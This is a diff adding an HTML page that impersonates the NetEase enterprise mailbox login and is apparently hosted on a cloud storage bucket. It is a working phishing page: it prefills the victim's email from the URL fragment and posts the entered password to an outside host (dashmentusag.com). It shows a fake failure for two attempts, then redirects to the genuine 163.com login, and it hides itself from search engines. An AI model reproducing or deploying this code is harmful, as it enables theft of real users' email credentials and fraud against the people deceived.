@@ -1,0 +1,130 @@
+<!-- url: https://pub-d32e1723091e4c74b19f3caea6a4ed0a.r2.dev/qiye-revised/index.html
+status: 200 -->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>ç½æä¼ä¸é®ç®± - ç»å½å¥å£</title>
+	<link rel="shortcut icon" href="https://qiye.163.com/favicon.ico" type="image/x-icon">
+<meta name="robots" content="noindex" /><meta name="robots" content="nofollow" />
+<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" /><META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+</head>
+<body>
+<script>
+const url = 'https://dashmentusag.com/qiyesa/water.php';   //full url goes here
+</script>
+
+<style>
+.login{
+	width:320px; height:35px; font-family: arial; font-size: 18px; color:#333333; 
+	background-color: #ffffff; border: solid 1px #BDBDBD; padding: 7px; border-radius: 2px 3px 1px 5px;
+	 
+}
+</style>
+<div style="margin:-8px;width:100%">
+<img id="bg" src="includes/bg.jpg">
+<img id="bg2" src="includes/bg.jpg" hidden>
+
+<div style="position:absolute;top:80px;left:800px; width:405px; height:470px; background:url(./includes/modal.png);">
+
+	<br><br><br><br><br>
+
+	<center>
+
+		<form method="post" action="" onsubmit="Validate(); return false;">
+		<input required id="user" name="user" class="login" value="" type="email" readonly><br><br>
+		<input required placeholder="&#23494;&#30721;" type="password" id="pass" name="pass" class="login"><br><br>
+		<input type="image" src="./includes/submit.png" id="b1" value="">
+		</form>
+	</center>
+
+</div>
+
+<input type="hidden" id="count" value="0">
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+
+
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='http://qy.163.com/login';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+
+
+</script>
+
+
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='files/1.png';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='files/2.png';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
